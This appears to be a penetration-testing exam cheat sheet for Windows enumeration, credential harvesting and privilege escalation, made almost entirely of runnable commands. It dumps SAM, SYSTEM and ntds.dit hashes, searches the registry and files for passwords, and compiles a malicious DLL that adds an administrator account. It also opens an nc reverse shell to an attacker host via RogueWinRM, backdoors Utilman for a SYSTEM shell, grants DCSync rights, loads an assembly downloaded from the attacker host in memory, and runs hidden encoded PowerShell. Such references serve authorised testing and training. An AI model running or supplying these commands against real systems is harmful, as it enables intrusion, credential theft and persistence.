# Windows enumeration and privilege escalation

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options.

## Windows Enumeration

```powershell
whoami /all                                                                                                                                      # show user privileges and groups
systeminfo                                                                                                                                       # show OS, patch, and domain info
net accounts && net user && net user /domain                                                                                                     # enumerate account policy and users
Get-LocalUser; Get-LocalGroup; Get-LocalGroupMember <GROUP>                                                                                      # enumerate local users and groups
Get-Service                                                                                                                                      # list services
Get-Process                                                                                                                                      # list running processes
tree /f C:\Users\                                                                                                                                # list user profile files
tasklist /SVC                                                                                                                                    # map processes to services
sc query                                                                                                                                         # query service states
schtasks /query /fo LIST /v                                                                                                                      # list scheduled tasks verbosely
$ts = New-Object -ComObject Schedule.Service; $ts.Connect(); $ts.GetFolder('<TASK_FOLDER>').GetTask('<TASK_NAME>').Definition | Format-List *    # scheduled task definition
wmic qfe get Caption,Description,HotFixID,InstalledOn                                                                                            # list installed hotfixes
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"                                                                           # check Winlogon secrets

# Hidden files
dir /a && dir /a:h && powershell ls -force    # reveal hidden files

# Installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname    # list installed 32-bit apps
```

## .NET Binary Analysis

```bash
monodis --output=<OUTPUT>.il <ASSEMBLY>.exe    # disassemble .NET assembly to IL for review
ilspycmd -p -o <OUTPUT_DIR> <ASSEMBLY>.exe     # decompile .NET assembly to C# project
```

## Windows Credential Harvesting

```powershell
cmdkey /list                                                              # list saved Windows credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"    # check autologon credentials
reg query HKLM /f password /t REG_SZ /s                                   # search machine registry for passwords
reg query HKCU /f password /t REG_SZ /s                                   # search user registry for passwords

# PowerShell history
(Get-PSReadlineOption).HistorySavePath                                                                      # show PowerShell history path
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt    # read PowerShell history

# Find passwords
findstr /si password *.xml *.ini *.txt                                                                                                  # search common text files for passwords
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue                                                    # find KeePass databases
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue    # find user documents

# Dump hashes
reg save hklm\system system.hive                                # save SYSTEM hive
reg save hklm\sam sam.hive                                      # save SAM hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL    # dump local hashes from hives
```

## Windows Privilege Escalation

### AlwaysInstallElevated

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer    # check current-user AlwaysInstallElevated policy
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer    # check local-machine AlwaysInstallElevated policy
msiexec /quiet /qn /i <PAYLOAD>.msi                             # silently install MSI payload if both keys are enabled
```

### DLL Hijacking

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}    # list running service paths
icacls .\PATH\TO\BINARY\<BINARY>.exe                                                                               # check binary permissions

# customdll.cpp:
# int main() { system("net user <USERNAME> <PASSWORD> /add"); system("net localgroup administrators <USERNAME> /add"); }
x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll    # compile malicious DLL
Restart-Service <SERVICE>                                         # restart service to load DLL
```

### Unquoted Service Paths

```bash
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """        # find unquoted service paths outside Windows
icacls "C:\"                                                                              # check root directory write permissions
icacls "C:\Program Files"    # check Program Files write permissions
# Drop malicious exe in writable path segment, restart service
Start-Service <SERVICE>    # restart service to trigger path hijack
```

### SeBackupPrivilege

```bash
reg save hklm\system C:\Users\<USERNAME>\system.hive            # copy SYSTEM hive with backup privilege
reg save hklm\sam C:\Users\<USERNAME>\sam.hive                  # copy SAM hive with backup privilege
impacket-secretsdump -sam sam.hive -system system.hive LOCAL    # extract hashes from copied hives

# diskshadow method for ntds.dit
diskshadow /s script.txt                                                # create shadow copy from script
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit    # copy ntds.dit with backup privilege
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL       # dump domain hashes offline
```

### SeImpersonate / SeAssignPrimaryToken

```bash
.\RogueWinRM.exe -p "C:\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"           # abuse WinRM impersonation for shell
.\GodPotato-NET4.exe -cmd '<COMMAND>'                                       # run command via GodPotato
.\PrintSpoofer64.exe -i -c powershell                                       # spawn SYSTEM PowerShell via PrintSpoofer
.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"    # test JuicyPotatoNG execution
```

### SeTakeOwnershipPrivilege

```bash
takeown /f C:\Windows\System32\Utilman.exe                  # take ownership of Utilman
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F    # grant write access to Utilman
copy cmd.exe utilman.exe                                    # click Ease of Access on logon screen for SYSTEM shell
```

### writeDACL

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force                               # convert password to secure string
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)    # build domain credential
Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync                         # grant DCSync rights
```

### Enable RDP / WinRM

```powershell
# RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f    # enable RDP logons
netsh advfirewall firewall set rule group="remote desktop" new enable=yes                                     # allow RDP firewall rules

# WinRM
winrm quickconfig    # enable WinRM listener
```

## PowerShell Tricks

```powershell
Set-ExecutionPolicy remotesigned                                        # allow locally created scripts
powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1    # run script with policy bypass
Import-Module .\<FILE>                                                  # import PowerShell module

# Switching user context
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force                      # convert plaintext password
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)    # build credential object
Enter-PSSession -ComputerName <RHOST> -Credential $cred                                  # start remote PowerShell session

# Execute remote commands as another user
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force                                # convert domain password
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)    # build domain credential
Invoke-Command -computername <COMPUTERNAME> -Credential $cred -command {whoami}                # run remote command as user

# .NET Reflection
$bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing).Content    # download assembly bytes
$assembly = [System.Reflection.Assembly]::Load($bytes)                               # load assembly in memory

# Base64 encode command
$Text = 'IEX(...)'                                          # define PowerShell payload text
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)    # encode payload as UTF-16LE bytes
$EncodedText = [Convert]::ToBase64String($Bytes)            # base64 encode payload
powershell -nop -w hidden -e $EncodedText                   # execute encoded PowerShell payload
```
